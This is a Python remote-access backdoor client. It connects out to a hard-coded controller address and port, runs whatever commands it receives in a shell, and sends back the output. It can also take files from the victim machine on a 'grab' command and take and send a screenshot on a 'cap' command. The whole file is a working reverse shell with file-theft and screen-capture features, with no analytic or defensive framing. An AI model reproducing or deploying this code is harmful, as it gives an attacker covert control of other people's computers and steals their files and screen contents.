import socket
import subprocess
import os
import tempfile
from PIL import ImageGrab

HOST_NAME = "192.168.43.129"
PORT_NAME = 8080

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        package = f.read(1024)
        while len(package) > 0:
            s.send(package)
            package = f.read(1024)
        s.send("DONE".encode())
    else :
        s.send("File not found!".encode())


def connect():
    s = socket.socket()
    s.connect((HOST_NAME, PORT_NAME))

    while True:
        command = s.recv(1024)

        if 'teminate' in command.decode():
            s.close()
            break
        if 'grab' in command.decode():
            grab, path = command.decode().split("*")
            transfer(s,path)

        if 'cd' in command.decode(): # cd*C:\folder\folder\test.py
            cd , directory = command.decode().split("*")
            if os.path.exists(directory):
                os.chdir(directory)
                s.send(("[+] current directory is " + os.getcwd() +".").encode())
            else :
                s.send("[-] no such directory")

        if 'cap' in command.decode(): # cap
            temdir = tempfile.mkdtemp()
            imgPath = temdir +"/test.jpg"
            ImageGrab.grab().save(imgPath,"JPEG")

            transfer(s,imgPath)


        else:
            CMD = subprocess.Popen(
                command.decode(),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())


if __name__ == '__main__':
    connect()
